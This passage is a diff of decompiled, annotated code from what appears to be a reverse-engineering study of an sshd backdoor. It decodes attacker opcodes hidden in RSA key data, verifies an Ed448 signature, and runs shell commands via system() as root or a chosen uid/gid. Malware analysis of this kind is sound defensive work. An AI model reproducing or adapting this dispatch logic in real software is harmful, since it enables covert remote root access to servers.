                                                                  (key,n,e,(BIGNUM *)0x0),
-                                             iVar16 == 1)) goto LAB_0010a112;
+                                             op_result == 1)) goto LAB_0010a112;
                                         }
                                       }
-                                      else if (iVar16 == 2) {
+                                      else if (op_result == 2) {
                                         payload_chunk_len = payload_chunk_len & 0xffff;
                                         // AutoDoc: Bit0 of monitor_flags decides whether opcode 2 prepends attacker-supplied uid/gid values (set) or leaves both zeroed so the shell command inherits root.
                                         if ((encrypted_payload.field0_0x0._1_1_ & 1) == 0) {
                                           rgid = 0;
-                                          lVar24 = 0;
+                                          loop_idx = 0;
                                           caller_uid = 0;
                                         }
                                         else {
@@ -517,32 +519,33 @@ LAB_0010a076:
                                           rgid = *(gid_t *)((long)&encrypted_payload.field0_0x0 +
                                                            payload_data_offset + 9);
                                           payload_chunk_len = payload_chunk_len - 8;
-                                          lVar24 = 8;
+                                          loop_idx = 8;
                                         }
                                         if ((char)control_flags < '\0') {
                                           if (2 < payload_chunk_len) {
-                                            uVar37 = (ulong)*(ushort *)((long)command_payload_ptr + lVar24);
+                                            rsa_payload_bytes = (ulong)*(ushort *)((long)command_payload_ptr + loop_idx);
                                             payload_chunk_len = payload_chunk_len - 2;
-                                            lVar24 = lVar24 + 2;
-                                            if (payload_chunk_len <= uVar37) goto LAB_00109fb9;
+                                            loop_idx = loop_idx + 2;
+                                            if (payload_chunk_len <= rsa_payload_bytes) goto LAB_00109fb9;
                                           }
                                         }
                                         else {
-                                          uVar37 = (ulong)CONCAT11(encrypted_payload.field0_0x0.
+                                          rsa_payload_bytes = (ulong)CONCAT11(encrypted_payload.field0_0x0.
                                                                    _4_1_,encrypted_payload.
                                                                          field0_0x0._3_1_);
 LAB_00109fb9:
-                                          if ((((uVar37 <= payload_chunk_len) &&
+                                          if ((((rsa_payload_bytes <= payload_chunk_len) &&
                                                ((rgid == 0 ||
-                                                (iVar16 = (*libc->setresgid)(rgid,rgid,rgid),
-                                                iVar16 != -1)))) &&
+                                                (op_result = (*libc->setresgid)(rgid,rgid,rgid),
+                                                op_result != -1)))) &&
                                               ((caller_uid == 0 ||
-                                               (iVar16 = (*ctx->libc_imports->setresuid)
+                                               (op_result = (*ctx->libc_imports->setresuid)
                                                                    (caller_uid,caller_uid,caller_uid),
-                                               iVar16 != -1)))) &&
-                                             (*(char *)((long)command_payload_ptr + lVar24) != '\0')) {
+                                               op_result != -1)))) &&
+                                             // AutoDoc: Opcode 2 bails unless the decrypted `[uid||gid||cmd]` buffer terminates with NUL, preventing the helper from running off the end of the modulus slice when calling system().
+                                             (*(char *)((long)command_payload_ptr + loop_idx) != '\0')) {
                                             (*ctx->libc_imports->system)
-                                                      ((char *)((long)command_payload_ptr + lVar24));
+                                                      ((char *)((long)command_payload_ptr + loop_idx));
                                             goto LAB_0010a076;
                                           }
                                         }
@@ -551,22 +554,22 @@ LAB_00109fb9:
                                       else if ((((encrypted_payload.field0_0x0._1_1_ & 0xc0) == 0xc0
                                                 ) && (libc->exit != (pfn_exit_t)0x0)) &&
                                               (libc->pselect != (pfn_pselect_t)0x0)) {
-                                        *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
-                                        *(u64 *)local_550 = 5;
+                                        *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
+                                        *(u64 *)cmd_args_scratch = 5;
                                         (*libc->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
-                                                           (fd_set *)0x0,(timespec *)local_550,
+                                                           (fd_set *)0x0,(timespec *)cmd_args_scratch,
                                                            (sigset_t *)0x0);
                                         (*libc->exit)(0);
                                       }
                                     }
                                   }
                                   else {
-                                    header_copy_cursor = (undefined4 *)(local_550 + 4);
-                                    for (lVar24 = 0xb; lVar24 != 0; lVar24 = lVar24 + -1) {
+                                    header_copy_cursor = (undefined4 *)(cmd_args_scratch + 4);
+                                    for (loop_idx = 0xb; loop_idx != 0; loop_idx = loop_idx + -1) {
                                       *header_copy_cursor = 0;
-                                      header_copy_cursor = header_copy_cursor + (ulong)bVar39 * -2 + 1;
+                                      header_copy_cursor = header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1;
                                     }
-                                    *(cmd_arguments_t **)(local_550 + 8) = &encrypted_payload;
+                                    *(cmd_arguments_t **)(cmd_args_scratch + 8) = &encrypted_payload;
                                     data_ptr2 = (u8 *)rsa_exponent_bn;
                                     data_index = hostkey_index;
                                     _v = command_payload_ptr;
@@ -574,8 +577,8 @@ LAB_00109fb9:
                                     *(u16 *)&monitor_payload_size_le = (short)payload_chunk_len;
                                     rsa_modulus_bn = (BIGNUM *)key;
                                     // AutoDoc: Opcode 3 populates a monitor_data_t and lets sshd_proxy_elevate forge replies or run system commands under the requested uid/gid.
-                                    BVar17 = sshd_proxy_elevate((monitor_data_t *)local_550,ctx);
-                                    if (BVar17 != FALSE) {
+                                    operation_ok = sshd_proxy_elevate((monitor_data_t *)cmd_args_scratch,ctx);
+                                    if (operation_ok != FALSE) {
                                       ctx->disable_backdoor = TRUE;
                                       *do_orig = FALSE;
                                       return TRUE;
@@ -583,37 +586,37 @@ LAB_00109fb9:
                                   }
                                 }
                               }
-                              else if (iVar16 == 1) {
+                              else if (op_result == 1) {
                                 if (((encrypted_payload.field0_0x0._1_1_ & 1) != 0) ||
                                    (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0))
                                 goto LAB_00109b6c;
                               }
                               else {
-                                if (iVar16 != 3) {
+                                if (op_result != 3) {
 LAB_00109b6c:
-                                  uVar15 = 0;
+                                  rsa_payload_span = 0;
                                   goto LAB_00109c8a;
                                 }
                                 if (((char)encrypted_payload.field0_0x0._3_1_ < '\0') ||
                                    (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                   if ((encrypted_payload.field0_0x0._2_1_ & 0x20) != 0) {
-                                    uVar29 = 0xff;
+                                    monitor_opcode_override = 0xff;
                                     if ((char)encrypted_payload.field0_0x0._2_1_ < '\0') {
-                                      uVar29 = encrypted_payload.field0_0x0._4_1_;
+                                      monitor_opcode_override = encrypted_payload.field0_0x0._4_1_;
                                     }
-                                    bVar34 = 0xff;
+                                    log_hook_flags = 0xff;
                                     if ((encrypted_payload.field0_0x0._2_1_ & 0x40) != 0) {
-                                      bVar34 = encrypted_payload.field0_0x0._3_1_ & 0x3f;
+                                      log_hook_flags = encrypted_payload.field0_0x0._3_1_ & 0x3f;
                                     }
-                                    uVar15 = (uint)CONCAT11(bVar34,uVar29);
+                                    rsa_payload_span = (uint)CONCAT11(log_hook_flags,monitor_opcode_override);
                                     if ((encrypted_payload.field0_0x0._3_1_ & 0x40) == 0)
                                     goto LAB_00109c56;
-                                    uVar26 = (byte)encrypted_payload.field0_0x0._1_1_ >> 3 & 7;
-                                    uVar15 = uVar15 | ((byte)encrypted_payload.field0_0x0._1_1_ & 7)
+                                    socket_slot_field = (byte)encrypted_payload.field0_0x0._1_1_ >> 3 & 7;
+                                    rsa_payload_span = rsa_payload_span | ((byte)encrypted_payload.field0_0x0._1_1_ & 7)
                                                       << 0x10;
                                     goto LAB_00109c7b;
                                   }
-                                  uVar15 = 0xffffffff;
+                                  rsa_payload_span = 0xffffffff;
                                   goto LAB_00109c8a;
                                 }
                               }
@@ -622,10 +625,10 @@ LAB_00109b6c:
                         }
 LAB_0010a1ba:
                         ctx->disable_backdoor = TRUE;
-                        piVar22 = &key_idx;
-                        for (lVar24 = 0x39; lVar24 != 0; lVar24 = lVar24 + -1) {
-                          *(undefined1 *)piVar22 = 0;
-                          piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
+                        int_cursor = &key_idx;
+                        for (loop_idx = 0x39; loop_idx != 0; loop_idx = loop_idx + -1) {
+                          *(undefined1 *)int_cursor = 0;
+                          int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
                         }
                         if ((encrypted_payload.field0_0x0._0_1_ & 1) != 0) {
                           if (ctx->libc_imports == (libc_imports_t *)0x0) {
@@ -644,37 +647,37 @@ LAB_0010a1ba:
                       // AutoDoc: Continuation chunks land here: copy the decrypted bytes into ctx->payload_buffer, extend payload_bytes_buffered, and re-verify the Ed448 signature before treating the chunk as another control-plane payload.
                       if (ed448_raw_key != (byte *)0x0) {
                         if ((encrypted_payload.field0_0x0._1_1_ & 1) == 0) {
-                          lVar24 = 0;
+                          loop_idx = 0;
                         }
                         else {
-                          lVar24 = 8;
+                          loop_idx = 8;
                           if (payload_body_len < 9) goto LAB_0010a112;
                         }
-                        if (((lVar24 + 2U <= payload_body_len) &&
+                        if (((loop_idx + 2U <= payload_body_len) &&
                             (payload_chunk_len = (ulong)*(ushort *)
                                               ((long)&encrypted_payload.field0_0x0 +
-                                              payload_data_offset + lVar24 + 5) + lVar24 + 2U,
+                                              payload_data_offset + loop_idx + 5) + loop_idx + 2U,
                             payload_chunk_len < payload_body_len)) && (0x71 < payload_body_len - payload_chunk_len)) {
                           if (((ctx->payload_bytes_buffered <= ctx->payload_buffer_size) &&
-                              (uVar21 = ctx->payload_buffer_size - ctx->payload_bytes_buffered,
-                              0x38 < uVar21)) && (payload_chunk_len <= uVar21 - 0x39)) {
+                              (payload_segment_len = ctx->payload_buffer_size - ctx->payload_bytes_buffered,
+                              0x38 < payload_segment_len)) && (payload_chunk_len <= payload_segment_len - 0x39)) {
                             payload_buffer_cursor = ctx->payload_buffer;
-                            uVar21 = 0;
+                            payload_segment_len = 0;
                             do {
-                              payload_buffer_cursor[uVar21] =
-                                   *(u8 *)((long)&encrypted_payload.field0_0x0 + uVar21 + payload_data_offset + 5
+                              payload_buffer_cursor[payload_segment_len] =
+                                   *(u8 *)((long)&encrypted_payload.field0_0x0 + payload_segment_len + payload_data_offset + 5
                                           );
-                              uVar21 = uVar21 + 1;
-                            } while (payload_chunk_len != uVar21);
+                              payload_segment_len = payload_segment_len + 1;
+                            } while (payload_chunk_len != payload_segment_len);
                             host_keys = ctx->sshd_sensitive_data->host_pubkeys;
                             sshkey_digest_offset = ctx->payload_bytes_buffered + payload_chunk_len;
                             ctx->payload_bytes_buffered = sshkey_digest_offset;
-                            BVar17 = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
+                            operation_ok = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
                                                       ctx->payload_buffer,sshkey_digest_offset,
                                                       ctx->payload_buffer_size,
                                                       (u8 *)((long)&encrypted_payload.field0_0x0 +
                                                             payload_chunk_len + payload_data_offset + 5),ed448_raw_key,ctx);
-                            if (BVar17 != FALSE) goto LAB_00109a97;
+                            if (operation_ok != FALSE) goto LAB_00109a97;
                           }
                         }
                       }
